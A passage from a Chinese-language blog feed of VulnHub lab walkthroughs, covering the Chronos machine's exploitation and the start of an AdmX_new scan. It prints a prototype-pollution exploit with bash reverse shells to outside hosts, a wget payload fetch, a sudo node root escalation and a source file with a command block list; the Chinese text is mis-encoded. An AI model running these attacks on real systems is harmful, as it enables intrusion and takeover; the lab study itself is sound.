class="line">7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeaterå†…å°†formatå‚æ•°å€¼æ›¿æ¢ä¸º7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS--&gt;Sendé‡æ”¾</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093156854.png" alt="image-20211104093156854"></p><p>è‡³æ­¤ï¼Œnc<strong>å»ºç«‹è¿æ¥æˆåŠŸ</strong></p><h3 id="3-å¯»æ‰¾ä¿¡æ¯"><a href="#3-å¯»æ‰¾ä¿¡æ¯" class="headerlink" title="3.å¯»æ‰¾ä¿¡æ¯"></a>3.å¯»æ‰¾ä¿¡æ¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104093314649.png" alt="image-20211104093314649"></p><p>å‘ç°åœ¨å½“å‰&#x2F;opt&#x2F;chronosç›®å½•ä¸‹ï¼Œå¹¶<strong>æ²¡æœ‰ç±»ä¼¼flagçš„ä¿¡æ¯</strong></p><p>å°è¯•æŸ¥çœ‹å…¶ä»–ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>â€‹<img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094438824.png" alt="image-20211104094438824"></p><p>â€‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094604888.png" alt="image-20211104094604888"></p><p>â€‹å‘ç°åœ¨homeç›®å½•ä¸‹<strong>å­˜åœ¨ç”¨æˆ·imera</strong></p><p>â€‹å°è¯•æŸ¥çœ‹imeraç”¨æˆ·æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd imera</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094950343.png" alt="image-20211104094950343"></p><p>å¾ˆå¯æƒœï¼ŒæŸ¥çœ‹å¤±è´¥ï¼Œå‘ç°åªæœ‰imeraç”¨æˆ·è‡ªå·±å¯ä»¥å¯¹user.txtè¿›è¡Œè¯»å†™ï¼Œ<strong>åªæœ‰ææƒæ‰èƒ½æ‰§è¡ŒæŸ¥çœ‹</strong></p><hr><h2 id="å››ã€æƒé™æå‡"><a href="#å››ã€æƒé™æå‡" class="headerlink" title="å››ã€æƒé™æå‡"></a>å››ã€æƒé™æå‡</h2><h3 id="1-åˆæ¬¡å°è¯•ææƒ"><a href="#1-åˆæ¬¡å°è¯•ææƒ" class="headerlink" title="1.åˆæ¬¡å°è¯•ææƒ"></a>1.åˆæ¬¡å°è¯•ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id  #å½“å‰ç”¨æˆ·æƒé™</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095325207.png" alt="image-20211104095325207"></p><p>æ˜¯ä¸€ä¸ªåä¸ºwww-dataçš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a   #åˆ©ç”¨æ˜¯å¦å­˜åœ¨å†…æ ¸æ¼æ´</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095419553.png" alt="image-20211104095419553"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l#åˆ©ç”¨æ˜¯å¦å­˜åœ¨sudoå‘½ä»¤æ¼æ´</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰åé¦ˆ.</p><p>åˆ©ç”¨å¸¸è§çš„ææƒæ–¹æ³•ï¼Œéƒ½æ²¡èƒ½æ‰¾åˆ°çªç ´å£ã€‚</p><p>è‡³æ­¤ï¼Œé™·å…¥äº†å›°å¢ƒâ€¦-_-</p><hr><h3 id="2-ä»£ç å®¡è®¡"><a href="#2-ä»£ç å®¡è®¡" class="headerlink" title="2.ä»£ç å®¡è®¡"></a>2.ä»£ç å®¡è®¡</h3><p>å°è¯•åœ¨å…¶ä»–ç›®å½•çœ‹èƒ½å¦å‘ç°çªç ´å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/chronos</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095949572.png" alt="image-20211104095949572"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100153967.png" alt="image-20211104100153967"></p><blockquote><p>{<br> â€œdependenciesâ€: {<br>   â€œbs58â€: â€œ^4.0.1â€,<br>   â€œcorsâ€: â€œ^2.8.5â€,<br>   â€œexpressâ€: â€œ^4.17.1â€<br> }<br>}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.js</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100502437.png" alt="image-20211104100502437"></p><blockquote><p>&#x2F;&#x2F; created by alienum for Penetration Testing<br>const express &#x3D; require(â€˜expressâ€™);<br>const { exec } &#x3D; require(â€œchild_processâ€);<br>const bs58 &#x3D; require(â€˜bs58â€™);<br>const app &#x3D; express();</p><p>const port &#x3D; 8000;</p><p>const cors &#x3D; require(â€˜corsâ€™);</p><p>app.use(cors());</p><p>app.get(â€˜&#x2F;â€˜, (req,res) &#x3D;&gt;{</p><p>res.sendFile(â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;index.htmlâ€);<br>});</p><p>app.get(â€˜&#x2F;dateâ€™, (req, res) &#x3D;&gt; {</p><p>var agent &#x3D; req.headers[â€˜user-agentâ€™];<br>var cmd &#x3D; â€˜date â€˜;<br>const format &#x3D; req.query.format;<br>const bytes &#x3D; bs58.decode(format);<br>var decoded &#x3D; bytes.toString();<br>var concat &#x3D; cmd.concat(decoded);<br>if (agent &#x3D;&#x3D;&#x3D; â€˜Chronosâ€™) {<br>  if (concat.includes(â€˜idâ€™) || concat.includes(â€˜whoamiâ€™) || concat.includes(â€˜pythonâ€™) || concat.includes(â€˜ncâ€™) || concat.includes(â€˜bashâ€™) || concat.includes(â€˜phpâ€™) || concat.includes(â€˜whichâ€™) || concat.includes(â€˜socatâ€™)) {</p><p>  res.send(â€œSomething went wrongâ€);</p><p>  }<br>  exec(concat, (error, stdout, stderr) &#x3D;&gt; {<br>      if (error) {<br>          console.log(<code>error: $&#123;error.message&#125;</code>);<br>          return;<br>      }<br>      if (stderr) {<br>          console.log(<code>stderr: $&#123;stderr&#125;</code>);<br>          return;<br>      }<br>      res.send(stdout);<br>  });<br>}<br>else{</p><p>  res.send(â€œPermission Deniedâ€);<br>}<br>})</p><p>app.listen(port,() &#x3D;&gt; {</p><p>console.log(<code>Server running at $&#123;port&#125;</code>);</p><p>})</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..                   #æ¥åˆ°ä¸Šçº§ç›®å½•</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100626091.png" alt="image-20211104100626091"></p><p>å‘ç°chronos-v2æ–‡ä»¶å¤¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd chronos-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100808654.png" alt="image-20211104100808654"></p><p>å‘ç°æ˜¯å¦ä¸€ä¸ªwebåº”ç”¨ï¼Œindex.htmlï¼ˆä¸»é¡µé¢ï¼‰ï¼Œfrontendï¼ˆå‰ç«¯ï¼‰ï¼Œbackendï¼ˆåç«¯ï¼‰</p><p>è¿›å…¥backendç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd backend</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100901040.png" alt="image-20211104100901040"></p><p>åŒæ ·çœ‹åˆ°äº†package.jsonæ–‡ä»¶ï¼Œè¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101138166.png" alt="image-20211104101138166"></p><blockquote><p>{<br> â€œnameâ€: â€œsome-websiteâ€,<br> â€œversionâ€: â€œ1.0.0â€,<br> â€œdescriptionâ€: â€œâ€,<br> â€œmainâ€: â€œserver.jsâ€,<br> â€œscriptsâ€: {<br>   â€œstartâ€: â€œnode server.jsâ€<br> },<br> â€œauthorâ€: â€œâ€,<br> â€œlicenseâ€: â€œISCâ€,<br> â€œdependenciesâ€: {<br>   â€œejsâ€: â€œ^3.1.5â€,<br>   â€œexpressâ€: â€œ^4.17.1â€,<br>   <strong>â€œexpress-fileuploadâ€: â€œ^1.1.7-alpha.3â€</strong>   #æ–‡ä»¶ä¸Šä¼ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br> }<br>}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat server.js</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101352160.png" alt="image-20211104101352160"></p><blockquote><p>const express &#x3D; require(â€˜expressâ€™);<br>const fileupload &#x3D; require(â€œexpress-fileuploadâ€);<br>const http &#x3D; require(â€˜httpâ€™)</p><p>const app &#x3D; express();</p><p>app.use(fileupload({ parseNested: true }));</p><p>app.set(â€˜view engineâ€™, â€˜ejsâ€™);<br>app.set(â€˜viewsâ€™, â€œ&#x2F;opt&#x2F;chronos-v2&#x2F;frontend&#x2F;pagesâ€);</p><p>app.get(â€˜&#x2F;â€˜, (req, res) &#x3D;&gt; {<br>  res.render(â€˜indexâ€™)<br>});</p><p>const server &#x3D; http.Server(app);<br><strong>const addr &#x3D; â€œ127.0.0.1â€</strong>         #reasonï¼šä¸ºä»€ä¹ˆæ‰«æçš„æ—¶å€™æ²¡æœ‰æ‰«æåˆ°8080ç«¯å£ answerï¼šå› ä¸ºWebåº”ç”¨åªæœ‰åœ¨æœ¬æœºæ‰èƒ½è®¿é—®<br><strong>const port &#x3D; 8080;</strong><br>server.listen(port, addr, () &#x3D;&gt; {<br>  console.log(â€˜Server listening on â€˜ + addr + â€˜ port â€˜ + port);<br>});</p></blockquote><h3 id="3-æœç´¢å¤§æ³•å¥½"><a href="#3-æœç´¢å¤§æ³•å¥½" class="headerlink" title="3.æœç´¢å¤§æ³•å¥½"></a>3.æœç´¢å¤§æ³•å¥½</h3><p>express-fileuploadæ¼æ´</p><p>ç™¾åº¦ï¼š<a href="https://www.sohu.com/a/412389503_100002744">æµè¡Œçš„Node.jsåº“ä¸­å­˜åœ¨åŸå‹æ±¡æŸ“æ¼æ´ï¼Œå¯è‡´Webåº”ç”¨ç¨‹åºé­å—DoSå’Œè¿œç¨‹Shellæ”»å‡»_Posix (sohu.com)</a></p><p>Googleï¼š<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></p><p><strong>å‘ç°EXP</strong></p><blockquote><p>import requests</p><p>cmd &#x3D; â€˜bash -c â€œbash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;p6.is&#x2F;8888 0&gt;&amp;1â€â€˜</p><p>#pollute</p><p>requests.post(â€˜<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>, files &#x3D; {â€˜<strong>proto</strong>.outputFunctionNameâ€™: (<br>   None, fâ€x;console.log(1);process.mainModule.require(â€˜child_processâ€™).exec(â€˜{cmd}â€™);xâ€)})</p><p>#execute command</p><p>requests.get(â€˜<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>)</p></blockquote><p>kali:</p><p>æ ¹æ®ipä¿®æ”¹EXP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi exp.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101833596.png" alt="image-20211104101833596"></p><blockquote><p>import requests</p><p>cmd &#x3D; â€˜bash -c â€œbash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.4&#x2F;4444 0&gt;&amp;1â€â€˜</p><p>#pollute</p><p>requests.post(â€˜<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>, files &#x3D; {â€˜<strong>proto</strong>.outputFunctionNameâ€™: (<br>   None, fâ€x;console.log(1);process.mainModule.require(â€˜child_processâ€™).exec(â€˜{cmd}â€™);xâ€)})</p><p>#execute command</p><p>requests.get(â€˜<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>)</p></blockquote><p>å·²å°†expå†™åœ¨æœ¬åœ°ï¼Œéœ€å°†è¯¥exp.pyä¸Šä¼ è‡³ç›®æ ‡ç«¯</p><p>kaliï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102630662.png" alt="image-20211104102630662"></p><p>shellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp   #æ˜“å‘é‡Œå†™æ–‡ä»¶</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102839677.png" alt="image-20211104102839677"></p><p>exp.pyä¸Šä¼ æˆåŠŸ</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103155596.png" alt="image-20211104103155596"></p><p>shellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103241230.png" alt="image-20211104103241230"></p><p><strong>æˆåŠŸå»ºç«‹åå¼¹shell</strong>ï¼Œå½“å‰ç”¨æˆ·ä¸ºimera</p><p>ç»“åˆä¹‹å‰çš„ä¿¡æ¯æ”¶é›†ï¼Œå¾—çŸ¥imeraç”¨æˆ·ä¸»ç›®å½•ä¸‹æœ‰<strong>user.txt</strong>æ–‡ä»¶ï¼Œè¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103811115.png" alt="image-20211104103811115"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103921395.png" alt="image-20211104103921395"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure><h3 id="4-æœ€ç»ˆææƒ"><a href="#4-æœ€ç»ˆææƒ" class="headerlink" title="4.æœ€ç»ˆææƒ"></a>4.æœ€ç»ˆææƒ</h3><p>å°è¯•è¿›å…¥rootç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104228705.png" alt="image-20211104104228705"></p><p>å¤±è´¥ï¼Œåœ¨æ­¤éœ€è¦ææƒ</p><p>å°è¯•æœ‰æ²¡æœ‰sudoææƒæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104353472.png" alt="image-20211104104353472"></p><p>å‘ç°ç”¨æˆ·imeraåœ¨æ²¡æœ‰rootç”¨æˆ·å¯†ç çš„æƒé™ä¸‹ï¼Œåªæ‰§è¡Œsudoï¼Œ<strong>å¯ä»¥æ‰§è¡Œnodeå’Œnpmå‘½ä»¤</strong></p><p>æœé›†å‘ç°äº†ä¸€æ®µä»£ç ï¼ˆè°ƒç”¨nodeæ‰§è¡Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹è¿è¡Œ&#x2F;bin&#x2F;bashï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104738393.png" alt="image-20211104104738393"></p><p>å‘ç°å·²ç»<strong>æˆåŠŸææƒ</strong>ä¸ºrootç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd root</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104834470.png" alt="image-20211104104834470"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure><hr><h2 id="å½©è›‹"><a href="#å½©è›‹" class="headerlink" title="å½©è›‹"></a>å½©è›‹</h2><p>CyberChef:</p><blockquote><p>user.txt</p><p>byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</p><p>â€“&gt;o chronos pernaei file mou.</p><p>è¯‘â€“&gt;æˆ‘ä»¬ç­¾ç½²äº†è°…è§£å¤‡å¿˜å½•ã€‚</p></blockquote><blockquote><p>root.txt</p><p>YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</p><p>â€“&gt;apopse siopi mazeuoume oneira.</p><p>è¯‘â€“&gt;æˆ‘å¾ˆé«˜å…´è§åˆ°ä½ ã€‚</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;: Chronos: 1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release&lt;/strong&gt;: 9 Aug 2021&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/al1enum,745/&quot;&gt;AL1ENUM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/chronos,495/&quot;&gt;Chronos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Download&lt;/strong&gt;:&lt;a href=&quot;https://download.vulnhub.com/chronos/Chronos.ova&quot;&gt;https://download.vulnhub.com/chronos/Chronos.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt; : medium&lt;/p&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-4-AdmX_new</title>
    <link href="http://example.com/2022/04/12/week4/"/>
    <id>http://example.com/2022/04/12/week4/</id>
    <published>2022-04-12T07:08:50.899Z</published>
    <updated>2022-04-12T07:10:44.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é¶æœºåœ°å€: <a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a><br>éš¾åº¦ç­‰çº§: ä¸­<br>æ‰“é¶ç›®æ ‡: å–å¾— 2 ä¸ª flag + root æƒé™</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091346386.png" alt="image-20211117091346386"></p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.11</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091944645.png" alt="image-20211117091944645"></p><h3 id="3-ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ"><a href="#3-ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ" class="headerlink" title="3.ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ"></a>3.ç«¯å£æœåŠ¡ä¿¡æ¯æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p80 10.0.2.11</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092313209.png" alt="image-20211117092313209"></p><h3 id="4-è®¿é—®10-0-2-11çš„80ç«¯å£é¡µé¢"><a href="#4-è®¿é—®10-0-2-11çš„80ç«¯å£é¡µé¢" class="headerlink" title="4.è®¿é—®10.0.2.11çš„80ç«¯å£é¡µé¢"></a>4.è®¿é—®10.0.2.11çš„80ç«¯å£é¡µé¢</h3><p>è®¿é—®ï¼š10.0.2.11:80</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092452624.png" alt="image-20211117092452624"></p><p>æ˜¯Apacheåœ¨Ubuntuä¸‹çš„é»˜è®¤é¡µé¢ï¼Œæ²¡æœ‰èƒ½å¤Ÿåˆ©ç”¨çš„ä¿¡æ¯</p><h3 id="5-ä½¿ç”¨feroxbusterç›®å½•æ‰«æ"><a href="#5-ä½¿ç”¨feroxbusterç›®å½•æ‰«æ" class="headerlink" title="5.ä½¿ç”¨feroxbusterç›®å½•æ‰«æ"></a>5.ä½¿ç”¨feroxbusterç›®å½•æ‰«æ</h3><p>ï¼ˆå­—å…¸ï¼šsudo apt install seclist   è¾ƒå¤§ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure><p>æ‰«æéƒ¨åˆ†ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117093525296.png" alt="image-20211117093525296"></p><h3 id="6-è®¿é—®å¯ç–‘ç›®å½•"><a href="#6-è®¿é—®å¯ç–‘ç›®å½•" class="headerlink" title="6.è®¿é—®å¯ç–‘ç›®å½•"></a>6.è®¿é—®å¯ç–‘ç›®å½•</h3><p>è®¿é—®<a href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a></p><p>è½½å…¥é¡µé¢çš„è¿‡ç¨‹é•¿è¾¾5åˆ†é’Ÿï¼Œåªèƒ½æ˜¾ç¤ºé¡µé¢çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œä¸”ä¸€ç›´å¤„äºåŠ è½½ä¸­çŠ¶æ€</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117100907047.png" alt="image-20211117100907047"></p><p>æ€è€ƒï¼šä¸€ä¸ªWordPressçš„ç«™ç‚¹ï¼Œç©¶ç«Ÿåœ¨è®¿é—®è¿‡ç¨‹ä¸­åŠ è½½äº†ä»€ä¹ˆï¼Ÿä½¿å¾—åŠ è½½è¿‡ç¨‹å¦‚æ­¤ç¼“æ…¢ï¼Ÿ</p><h3 id="7-ä½¿ç”¨Burpsuiteå¯¹è®¿é—®é¡µé¢çš„æµé‡è¿›è¡Œåˆ†æ"><a 